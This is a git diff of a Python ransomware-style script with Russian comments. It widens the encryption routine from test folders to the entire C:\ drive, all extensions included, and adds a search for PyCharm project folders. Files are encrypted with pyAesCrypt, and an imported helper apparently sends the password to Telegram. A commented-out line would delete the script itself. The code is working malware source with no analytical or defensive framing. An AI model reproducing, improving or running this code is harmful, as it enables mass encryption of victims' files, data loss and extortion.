@@ -12,8 +12,21 @@ from send_password import send_password_to_telegram
 
 user_path = os.path.join(os.environ["USERPROFILE"])
 
-# Список директорий для шифрования
-directories = [r"C:\\test1", r"C:\\test", user_path]
+def find_pycharm_projects():
+    # Указываем директорию, с которой нужно начинать поиск (например, на диске C:)
+    search_start_dir = "C:\\"  # На Windows ищем с корня диска C
+
+    for root, dirs, files in os.walk(search_start_dir):
+        if 'PycharmProjects' in dirs:  # Проверяем, существует ли папка PycharmProjects в текущем каталоге
+            return os.path.join(root, 'PycharmProjects')
+    return None
+
+pycharm_projects_path = find_pycharm_projects()
+# Список директорий для шифрования и указания расширений
+directories = [
+    (pycharm_projects_path, ".py"),
+    (r"C:\\", None),  # None означает все расширения
+]
 
 def generate_password(length=12):
     # Набор символов для генерации пароля
@@ -87,6 +100,7 @@ def locker():
 def crypter():
     def crypt(file):
         try:
+            print(file)
             password = crypt_pass
             bufferSize = 512 * 1024
             pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, bufferSize)
@@ -96,22 +110,26 @@ def crypter():
         except ValueError as e:
             print(f"Невозможно прочитать файл {file}: {e}")
 
-    def walk(dir):
+    def walk(dir, ext):
         try:
             for name in os.listdir(dir):
                 path = os.path.join(dir, name)
-                if os.path.isfile(path) and path.endswith(".py"):
+                # Пропускаем папки, в которых есть 'venv' в названии
+                if 'venv' in name.lower():
+                    continue  # Пропускаем эту папку
+
+                if os.path.isfile(path) and (ext is None or path.endswith(ext)):
                     crypt(path)
                 elif os.path.isdir(path):
-                    walk(path)
+                    walk(path, ext)
         except FileNotFoundError:
             print(f"Директория {dir} не найдена. Пропускаем...")
         except PermissionError:
             print(f"Нет доступа к директории {dir}. Пропускаем...")
 
-    for directory in directories:
-        print(f"Начинаем шифрование в {directory}...")
-        walk(directory)
+    for directory, ext in directories:
+        print(f"Начинаем шифрование в {directory} с расширением {ext if ext else 'все файлы'}...")
+        walk(directory, ext)
 
     print("Encryption complete.")
     # os.remove(sys.argv[0])
